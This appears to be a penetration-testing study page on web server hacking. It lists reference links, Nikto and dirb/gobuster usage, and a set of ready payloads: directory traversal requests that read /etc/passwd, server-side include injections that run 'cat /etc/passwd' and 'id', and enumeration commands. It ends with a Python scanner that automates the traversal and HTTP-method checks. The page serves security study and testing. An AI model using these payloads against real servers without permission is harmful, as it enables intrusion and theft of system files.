# Web Server Hacking - Topics Overview

## Topic Explanation
Web server hacking involves exploiting vulnerabilities in web server software, configurations, and underlying infrastructure to gain unauthorized access, steal data, or disrupt services. Common targets include Apache, Nginx, IIS, and other web servers. Attack vectors include directory traversal, server-side includes injection, buffer overflows, privilege escalation, and exploitation of default configurations, unpatched vulnerabilities, and misconfigurations.

## Articles for Further Reference
- [OWASP Web Server Security](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST Guidelines for Securing Web Servers](https://csrc.nist.gov/publications/detail/sp/800-44/version-2/final)
- [Apache Security Tips](https://httpd.apache.org/docs/2.4/misc/security_tips.html)

## Reference Links
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [CVE Database](https://cve.mitre.org/)
- [Exploit Database](https://exploit-db.com/)

## Available Tools for the Topic

### Tool Name: Nikto
**Description:** Web server vulnerability scanner that tests for dangerous files, outdated server software, and server configuration issues.

**Example Usage:**
```bash
# Basic scan
nikto -h http://target-server.com

# Scan with specific plugins
nikto -h target-ip -Plugins @@ALL

# Save results
nikto -h target-ip -o results.html -Format htm
```

### Tool Name: Dirb/Dirbuster
**Description:** Web content discovery tools for finding hidden directories and files on web servers.

**Example Usage:**
```bash
# Basic directory enumeration
dirb http://target-server.com

# Custom wordlist
dirb http://target-server.com /usr/share/wordlists/dirb/big.txt

# Gobuster alternative
gobuster dir -u http://target-server.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

## All Possible Payloads for Manual Approach

### Directory Traversal Attacks
```bash
# Basic directory traversal
curl "http://target.com/page.php?file=../../../etc/passwd"
curl "http://target.com/page.php?file=..\..\..\..\windows\system32\drivers\etc\hosts"

# URL encoded
curl "http://target.com/page.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Double encoding
curl "http://target.com/page.php?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
```

### Server-Side Include (SSI) Injection
```html
<!--#exec cmd="cat /etc/passwd"-->
<!--#exec cmd="id"-->
<!--#include virtual="/etc/passwd"-->
<!--#echo var="DATE_LOCAL"-->
```

### Web Server Enumeration
```bash
# Banner grabbing
curl -I http://target-server.com
nmap -sV -p 80,443 target-ip

# HTTP methods enumeration
curl -X OPTIONS http://target-server.com
curl -X TRACE http://target-server.com
```

## Example Payloads

### Web Server Vulnerability Scanner
```python
#!/usr/bin/env python3
import requests
import re
from urllib.parse import urljoin

class WebServerScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
    
    def scan_server_info(self):
        """Gather server information"""
        response = self.session.get(self.target_url)
        server = response.headers.get('Server', 'Unknown')
        print(f"Server: {server}")
        
        # Check for version disclosure
        if any(version in server.lower() for version in ['apache/2.2', 'nginx/1.10', 'iis/6.0']):
            self.vulnerabilities.append("Outdated server version detected")
    
    def test_directory_traversal(self):
        """Test for directory traversal vulnerabilities"""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for payload in payloads:
            url = f"{self.target_url}?file={payload}"
            response = self.session.get(url)
            
            if "root:" in response.text or "[fonts]" in response.text:
                self.vulnerabilities.append(f"Directory traversal: {payload}")
    
    def test_http_methods(self):
        """Test dangerous HTTP methods"""
        dangerous_methods = ['TRACE', 'TRACK', 'DELETE', 'PUT']
        
        for method in dangerous_methods:
            response = self.session.request(method, self.target_url)
            if response.status_code < 400:
                self.vulnerabilities.append(f"Dangerous HTTP method enabled: {method}")

# Usage
scanner = WebServerScanner("http://target-server.com")
scanner.scan_server_info()
scanner.test_directory_traversal()
scanner.test_http_methods()
```